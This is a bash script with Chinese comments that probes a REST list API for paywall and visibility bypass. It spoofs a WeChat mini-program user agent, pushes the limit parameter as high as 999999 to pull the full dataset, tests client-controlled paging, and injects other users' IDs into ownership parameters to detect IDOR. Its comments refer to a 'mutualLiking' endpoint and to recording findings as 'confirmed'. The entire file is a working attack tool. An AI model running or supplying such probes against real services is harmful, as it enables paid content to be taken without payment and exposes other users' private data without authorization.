#!/bin/bash
# limit / page 直通探测 —— 判定"服务端未裁剪、前端过滤"型付费墙或可见性绕过
# 适用：REST 列表接口，参数里带 limit|size|pageSize 与 page|offset
set -u
# ---- 参数检查 ----
if [ $# -lt 1 ]; then printf '用法: ./limit_escalation_probe.sh <HOST> [PATH]   （或设 HOST/PATHX 环境变量）\n' >&2; exit 1; fi
HOST="${1:-${HOST:-}}"
PATHX="${2:-${PATHX:-/v1/items/list}}"; HOST="${HOST%/}"
TOK="${TOK:-YOUR_TOKEN}"
UA="${UA:-Mozilla/5.0 MicroMessenger/8.0.49 miniProgram}"
OUT="${OUT:-/tmp/escalation_out}"
mkdir -p "$OUT"

probe() { # $1=query
  curl -s -m 25 "https://$HOST$PATHX?$1" \
    -H "Host: $HOST" \
    -H "token: $TOK" \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    -H "User-Agent: $UA" \
    -H 'Accept: */*' -o "$OUT/last.json" -w '%{http_code} %{size_download}'
}

count() { python3 - "$OUT/last.json" <<'PY'
import json,sys
try: d=json.load(open(sys.argv[1]))
except Exception: print('parse_err'); raise SystemExit
a=d.get('data')
def n(x):
    if isinstance(x,list): return len(x)
    if isinstance(x,dict):
        for k in ('list','rows','items','records','data'):
            if isinstance(x.get(k),list): return len(x[k])
    return 'NA'
print(n(a))
PY
}

echo "== 1) limit 梯度：找上限，看是否等于数据集总量 =="
for L in 1 5 15 50 86 87 100 500 1000 9999 99999 999999; do
  r=$(probe "page=1&limit=$L"); c=$(count)
  echo "limit=$L -> http/bytes=$r count=$c"
done

echo
echo "== 2) page 递增：OFFSET 是否客户端可控 =="
for P in 1 2 3 5 10; do
  r=$(probe "page=$P&limit=9999"); c=$(count)
  echo "page=$P -> http/bytes=$r count=$c"
done

echo
echo "== 3) 归属参数是否被消费（md5 逐字节比对） =="
probe "page=1&limit=9999" >/dev/null; base=$(md5sum "$OUT/last.json" | cut -d' ' -f1)
echo "baseline md5=$base"
for K in userid uid fid to_userid touserid other_userid target_id from_userid; do
  probe "page=1&limit=9999&$K=OTHER_ID" >/dev/null
  m=$(md5sum "$OUT/last.json" | cut -d' ' -f1)
  [ "$m" = "$base" ] && echo "$K -> IDENTICAL（参数被忽略，非 IDOR）" || echo "$K -> DIFFERS（参数被消费，继续验证越权）"
done

echo
echo "提示：再用同族'正确实现'的接口做对照组（如 mutualLiking 只返回互相喜欢），"
echo "      若对照组正确裁剪而本接口全量下发 → 判定单点疏漏，可按 confirmed 落库。"
